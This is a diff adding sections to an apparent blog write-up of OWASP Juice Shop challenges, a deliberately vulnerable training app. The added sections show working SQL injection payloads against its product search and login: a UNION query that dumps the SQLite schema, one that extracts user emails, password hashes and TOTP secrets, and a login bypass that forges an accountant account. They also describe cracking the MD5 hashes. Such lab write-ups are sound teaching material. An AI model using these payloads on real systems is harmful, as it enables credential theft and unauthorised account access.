@@ -72,7 +72,7 @@ ResultSet results = pstmt.executeQuery( );
 
 
 
-The site uses the /sqli/#/sqli/search when searching the site from the search bar. What comes after the hash(#) is called a fragment. I will not go to deep into why, but essentialy this is just identifying a part of the page, which keeps the query confined to the client side.
+The site uses the /#/ when searching the site from the search bar. What comes after the hash(#) is called a fragment. I will not go to deep into why, but essentialy this is just identifying a part of the page, which keeps the query confined to the client side.
 
 The first part of the challenge here is identifying a different way to use the search so that we are able to perform the sql injection.
 
@@ -103,9 +103,9 @@ This is a very good sign since it tells me that the server is using SQLite, and 
 
 Now I can coninue the injection attack.
 
->Note: the '; resulted in an error due to the original query not being ended properly.
+>Note: the '; resulted in an error due to the original query not being terminated properly.
 
-To remediate this is just a matter of determining how many ) were used in the original query
+Now it is just a matter of determining how many ) were used in the original query.
 
 ```SQL
 '))--
@@ -131,3 +131,88 @@ This still did not complete the challenge however, I realized I needed to actual
 ### Database Schema
 #### Difficulty: Easy
 
+We already found that we can query the database using the /rest/products/search?q=
+
+Now it is just a matter of querying the database in a way that returns the entire DB schema deffinition. 
+
+Since we know the database is using SQLite, it's simple to google the syntax which that version of sql uses.
+
+We can use the UNION select command to tell the database to perform another search in addition to the one it is already using. 
+
+Since we are querying within the 'Products', it will return an error if the number of columns is not the same.
+
+Use a bit of trial and error to discover the same number of columns as the original query. 
+
+![num_columns](https://github.com/jjolley91/blog/blob/main/static/sqli/num_columns.png?raw=true)
+
+finally, at 9, we have the correct number of columns!
+
+![columns_success](https://github.com/jjolley91/blog/blob/main/static/sqli/columns_success.png?raw=true)
+
+now, we can just replace the first number with sql, and it will return the information for the full database schema in the corresponding column
+ 
+>Note doing this in burp requires you to URL encode the spaces. %20
+
+```HTML
+GET /rest/products/search?q=eggs'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
+
+```
+
+
+
+### Retrieving Passwords:
+
+#### Difficulty: Easy
+
+#### This section covers the challenges for logging in as Admin, Bender, and Jim.
+
+Now that we know how to get info from the DB, how much info can we get?
+The answer is A LOT.
+
+This is just a matter of looking at the fields we got back when we dumped the db schema, and changing the columns to that of the users table:
+
+![sql_user_columns](https://github.com/jjolley91/blog/blob/main/static/sqli/sql_user_columns.png?raw=true)
+
+we can see the list of columns here. Any of these columns look interesting?
+>Note: There are more than 9 columns in the users table, but since we are querying through the proudcts search we need to pick nine to use:
+
+![query_users](https://github.com/jjolley91/blog/blob/main/static/sqli/query_users.png?raw=true)
+
+query:
+```HTML
+ eggs'))UNION%20SELECT%20id,email,password,role,isActive,username,createdAt,deletedAt,totpSecret%20FROM%20Users--
+ ```
+
+Note the password field is just under the email field, and they are hashed somehow. I found which type of hash was used by googling for a hash identifier
+
+![id_hash](https://github.com/jjolley91/blog/blob/main/static/sqli/id_hash.png?raw=true)
+
+From here we can retrieve the passwords simply by decrypting the md5 hashes! We can now log in as any user we want!
+
+![hash_decryptor](https://github.com/jjolley91/blog/blob/main/static/sqli/hash_decryptor.png?raw=true)
+
+
+
+
+### Ephemeral Accountant
+
+#### Difficulty: Moderate
+
+
+
+For this one, I intercepted a bogus login request with burp, and sent it to repeater.
+
+we saw the table 'Users' when we dumped the schema in the last section.
+
+:"acc0unt4nt@juice-sh.op"
+
+```SQL
+
+' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--
+```
+
+That's a pretty beefy query, but it gets the job done! we are now logged in as a nonexistant user!
+
+
+
+GET /rest/products/search?q=eggs'))UNION%20SELECT%20id,email,password,role,isActive,username,createdAt,deletedAt,totpSecret%20FROM%20Users--
